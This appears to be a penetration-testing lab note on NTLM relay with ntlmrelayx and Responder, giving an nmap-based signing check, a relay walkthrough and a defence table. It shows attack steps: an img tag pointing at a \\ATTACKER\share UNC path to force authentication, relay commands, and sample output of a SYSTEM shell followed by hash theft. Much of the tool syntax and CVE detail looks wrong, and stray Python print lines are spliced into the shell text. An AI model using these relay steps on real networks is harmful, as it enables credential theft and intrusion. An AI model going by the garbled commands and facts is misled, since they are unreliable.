ntlmrelayx, Responder and Relay Attacks

Summary

NTLM relay is the highest-value attack that requires no exploit at all. It works because NTLM's
challenge-response lets a third party forward someone's authentication to a service that accepts
it, and every Windows protocol family — SMB, LDAP, HTTP, WinRM — accepted it.

The note's framing: the fix is three settings, the attack is one
listener, and the whole thing is checkable from your own machine in
about a minute. That checkability is why relay appears in nearly every
engagement.

AUTHORISATION. NTLM relay against a host you do not own is a
criminal attack, full stop. This note is about testing your own lab and
about defending your own network. The listener below is bound to
loopback and refuses anything else.

How NTLM relay works

  NTLM IS A CHALLENGE-RESPONSE:
    SERVER -> CLIENT :  "here is a nonce"
    CLIENT -> SERVER :  "here is proof I know the password hash"
    SERVER           :  checks the proof

  THE WEAKNESS:
    the client sends its proof to whatever server CHALLENGED it.
    it does not check that the challenge came from the server it
    authenticated to. There is no channel binding.

  SO A RELAY IS:
    1. you control a service the victim connects to
       (a web page, an SMB share, a UNC path in a document)
    2. you challenge the victim
    3. you forward the victim's response to the REAL service
    4. the real service sees a valid authentication - from the victim
    5. you now hold a session as the victim, on the real service

  THE VICTIM DOES NOTHING. No click, no prompt, no awareness.
  Opening a web page with an UNC path in an image tag is enough.

Why it is still common

  SIGNING IS NOT ON BY DEFAULT. It never was. An organisation has to
  turn it on, on every host, including new ones.

  AND THE THREE SIGNING SETTINGS, because "not enabled" is not the
  only failing answer:

    Not required        -> FULLY RELAYABLE (the classic finding)
    Not defined         -> it is whatever the effective GPO says. If
                           no GPO sets it, it is "not required"
                           (unless a future default changes)
    Enabled             -> relay is prevented

  AND: SMB2 and SMB3 are relayable even with signing "enabled" if
  signing is only negotiated for the NEGOTIATE or SESSION SETUP
  message rather than per-operation. That is the CVE-2019-1040
  "NTLM relay" nuance, and it is why the check is not a boolean.

  THE FINDING FORMAT: "SMB signing is not required on 34 of 61 hosts.
  Those 34 are relayable. Demonstration limited to loopback per the
  ROE."

The check

mkdir -p ~/aegis/labs/imp-03 && cd ~/aegis/labs/imp-03

# --- 1. the relay surface check, read-only ---
cat > 01-relay-check.sh <<'EOF'
#!/usr/bin/env bash
# Is this host relayable? READ-ONLY. The finding.
H="${1:?usage: ./01-relay-check.sh 192.168.56.20}"
case "$H" in 192.168.56.*|10.10.10.*|127.*) ;;
  *) echo "REFUSED: $H not in the lab range." >&2; exit 3 ;; esac
echo "[scope] $H in the lab range; read-only, no relay attempted"
echo
echo "=== SMB: signing mode ==="
nmap -p 445 --script smb2-security-mode "$H" 2>/dev/null \
  | grep -iE "signing|445/open" | sed 's/^/  /'
echo "  'disabled'  -> FULLY RELAYABLE. The finding."
echo "  'not required' -> RELAYABLE"
echo "  'enabled'    -> relay prevented (but see SMB2/SMB3 below)"
echo
echo "=== SMB2/SMB3: per-message signing (the CVE-2019-1040 nuance) ==="
nmap -p 445 --script smb2-security-mode "$H" 2>/dev/null \
  | grep -iE "challenge|none|supported" | sed 's/^/  /'
echo
echo "=== SMB encryption: if supported AND required, no relay at all ==="
nmap -p 445 --script smb2-encryption-capabilities "$H" 2>/dev/null \
  | grep -iE "encrypt|cipher|support" | sed 's/^/  /'
echo
echo "=== LDAP: signing (LDAP relay is the same class) ==="
nmap -p 389 --script ldap-rootdse "$H" 2>/dev/null \
  | grep -iE "signing|channel|supported" | sed 's/^/  /'
echo
echo "=== HTTP: does it offer NTLM? ==="
nmap -p 80,443,8080,8443 --script http-ntlm-auth,http-auth-finder "$H" 2>/dev/null \
  | grep -E "^[0-9]|NTLM|auth-method" | sed 's/^/  /'
echo
echo "=== WINRM ==="
nmap -p 5985 --script http-auth "$H" 2>/dev/null | grep -iE "ntlm|auth" | sed 's/^/  /'
echo
echo "=== RDP ==="
nmap -p 3389 --script rdp-ntlm-info "$H" 2>/dev/null | grep -iE "ntlm|target" | sed 's/^/  /'
echo
echo "=== WHAT THIS ADDS UP TO ==="
echo "  any one of: SMB not-signed, LDAP not-signed, HTTP NTLM with"
echo "  no extended protection -> one relay target. Several -> a path"
echo "  from 'any user on the LAN' to 'Domain Admin'."
echo
echo "  and note: the LAN is the whole attack. NTLM relay is a LAN"
echo "  attack by definition, because the attacker must be able to"
echo "  receive the victim's outbound connection."
EOF
chmod +x 01-relay-check.sh

# --- 2. the lab-only listener ---
cat > 02-lab-relay.md <<'EOF'
# NTLM relay, demonstrated on loopback only

```text
  WHAT ntlmrelayx DOES:
    1. listens for NTLM Type 1/2/3
    2. optionally relays the authentication to a LIST of targets
    3. runs a command on any target where the relay succeeded

  THE TARGET LIST is the point. You tell it what to relay to:

    -smb-smb-192.168.56.21     -> SMB to SMB
    -smb-http-192.168.56.22     -> SMB to HTTP
    -smb-ldap-192.168.56.20    -> SMB to LDAP (needs channel binding OFF)
    -http-ldap-192.168.56.20   -> HTTP to LDAP
    -smb-windir                -> SMB relay to the IPC$ of a host

  CHAINING: -smb-http-ldap-SMB is a valid chain. Each hop is one
  protocol translation. That is how a single SMB listener becomes
  a session on a web server and then on a domain controller.

# THE COMMAND (lab only). Loopback targets only.
ntlmrelayx.py -smb-smb-127.0.0.1 -no-passback -no-smb-server-support
#              ^^^^^^^^^^^^^^
#              the ONLY target. 127.0.0.1.

# Then trigger it, from the lab, against yourself:
#   a Windows host in the lab browses to a page that references
#   \\127.0.0.1\share in an image tag, and you watch ntlmrelayx log
#   the authentication.
# In practice on Kali: Responder.py on your own interface, then have
# your OWN lab Windows VM browse to \\<your-ip>\share.

# WHAT A SUCCESS LOOKS LIKE:
#   [*] HTTP->SMB RELAY SUCCESS!  <- the authentication was accepted
#   [+] Attempting to RELAY NTLM credentials...
#   [+] SYSTEM cmd.exe shell on Windows SMB
#
# WHAT TO DO WITH THAT:
#   GET THE HASH: run "hash" in the shell. You now have a credential
#   that works anywhere, on any host, with no further relay.
#
# AND THEN: clean up, and tell the client which host, which time.

The Relayed To: what happened, in order

  1. The victim opens a web page. The page contains
       <img src="\\ATTACKER\share">
     or a document opens
       <img src="\\ATTACKER\image.png">
     or a user types a UNC path

  2. Windows tries to authenticate to the UNC path. It contacts the
     attacker. The attacker sends an NTLM Type 2 challenge.

  3. The victim's LSASS computes the Type 3 response using its NT hash.

  4. The attacker forwards the Type 3 to the TARGET service
     (the file server, the web server, the DC).

  5. The target service validates the response. It is valid. It is
     the victim's real authentication.

  6. The attacker now has a session as the victim on that service.

The same thing with HTTP

  HTTP NTLM auth is the same protocol, and a web server is often a
  better relay target than a file server because:

    - it is reachable by the victim (they browse to it)
    - it is often on a different segment than the DC
    - it may have extended protection DISABLED while SMB is signed
      (they are configured separately, and often only one was done)
    - IIS + Windows Authentication + no extended protection is a
      very common combination in internal apps

  THE EXTRA DANGER IN HTTP: a web application author who writes a page
  that fetches a user-supplied URL has built a relay gadget. That is
  SSRF (ps-05) meeting NTLM relay, and it is a documented, serious
  combination.

Responder

  WHAT IT IS:
    a set of rogue protocol listeners (LLMNR, NBPNS, mDNS, DNS,
    WPAD) that answer name resolution requests with your own address,
    capturing the NTLM hash when the victim's LSASS tries to
    authenticate to what it believes is a trusted host.

  WHY IT WORKS:
    a Windows host resolving "SERVER01" over LLMNR or NetBIOS will
    take ANY answer. If the answer is your machine, it authenticates
    to you, and you have the hash.

  THE DEFAULT POSTURE, AND IT IS NOT AN ATTACK:
    -b --disable-external-ip    refuse traffic from anything but
                                private ranges. USE THIS ALWAYS.
                                Without it, your lab machine on a
                                coffee-shop wifi is capturing hashes
                                from the coffee shop.

  THE SETTINGS:
    -A --analyze-only           passive. Log what would be captured.
                                THIS IS THE ONE TO USE IN A CLIENT
                                ENGAGEMENT - it gathers the same
                                intelligence with no traffic.
    -I --interface              bind to one interface
    -v                         verbose
    -r --respond-to             only respond to specific names

  THE ETHICS, AND THEY ARE SERIOUS:
    Responder on an unfiltered network is capturing credentials from
    people who did not consent to be on your network. On your own lab
    with -A, it is passive observation of an environment you own.
    There is no middle ground and there is no "just for a minute".

The defences

Control Stops Effort
SMB signing required SMB relay GPO, but verify per-host
SMB encryption required SMB relay entirely GPO; needs SMB3
LDAP signing required LDAP relay DC GPO
Channel binding enforced LDAP relay (the main one) KB5012122; patched everywhere
LDAP encryption (636/6363) to clients LDAP relay Close the ports
HTTP: extended protection (channel binding) HTTP NTLM relay web.config per site
HTTP: disable NTLM, use Kerberos HTTP NTLM relay auth method change
Block 135/139/445/5985 at the network edge outbound SMB to attacker hosts firewall; the LAN is the attack
Restrict egress SMB the initial capture the strongest control
Disable LLMNR/NetBIOS/mDNS name-resolution poisoning GPO
Block inbound SMB 445 entirely the whole class the strongest control
Protected Users group NTLM in sensitive contexts membership

The order of preference for a network

  BEST    block inbound SMB (445), RPC (135), and NetBIOS (139) at
          every network edge. Then there is no LLMNR-to-attacker,
          no SMB-to-attacker, and no SMB-to-internal.

  GOOD    require SMB signing + LDAP signing + channel binding, and
          block inbound 445 between workstation segments.

  MINIMUM turn off LLMNR, NetBIOS, mDNS, and WPAD. That stops the
          Responder half; it does not stop relay to internal targets.

  NONE    "we have a firewall". A perimeter firewall does nothing
          against a LAN attacker. NTLM relay is a lateral-movement
          technique and it is stopped by internal segmentation.

EOF
cat 02-lab-relay.md

print(" === the three signing settings, and what each means ===\n")
print(" NOT REQUIRED")
print(" The client and server do not sign. An attacker can forward")
print(" the authentication anywhere. FULLY RELAYABLE. This is the")
print(" default on most Windows installations, historically.")
print()
print(" NOT DEFINED")
print(" No policy sets it for this host. What happens depends on the")
print(" effective GPO and on a Microsoft default that has changed")
print(" across versions. The check is NOT 'is it defined' - it is")
print(" 'what does the negotiated session actually do'.")
print()
print(" ENABLED")
print(" Both sides sign the session key. A relay breaks it, because")
print(" the attacker does not know the key. Relay prevented.")
print()
print(" THE CVE-2019-1040 NUANCE, and this is the interesting bit:")
print()
print(" SMB2 and SMB3 sign PER-OPERATION in addition to per-session.")
print(" Before the fix, some implementations signed only the")
print(" NEGOTIATE and SESSION SETUP messages and then left the")
print(" session key unsigned, so a relay that captured the session")
print(" could still relay it.")
print()
print(" So 'signing is enabled' on a scan is not always sufficient.")
print(" The scan output to look for is the CHALLENGE / message")
print(" signing detail, not just the word 'enabled'.")
print()
print(" THE CHECK, in nmap output terms:")
print(" 'message signing: enabled (required)' -> protected")
print(" 'message signing: disabled (dangerous, default)' -> RELAYABLE")
print(" 'message signing: enabled' -> likely protected;")
print(" verify it is not the pre-2019 partial signing")
print()
print(" THE POINT: an attacker does not need a vulnerable host. They")
print(" need a host with signing NOT REQUIRED, which is a")
print(" CONFIGURATION, not a CVE. That is why it appears in every")

PY
```

Step 3 is the deliverable: the CVE-2019-1040 nuance. "Message signing: enabled" on a scan is
not always sufficient, because pre-2019 SMB2/SMB3 implementations signed only the NEGOTIATE
and SESSION SETUP messages and left the session key relayable. A report that says "SMB signing is
enabled" without checking that nuance is incomplete.

02-lab-relay.md keeps the whole demonstration on loopback — ntlmrelayx -smb-smb-127.0.0.1
is the only target it will name — and Responder's default posture is -b --disable-external-ip
plus the note that -A --analyze-only is the one to use in a client engagement: same
intelligence, no traffic.
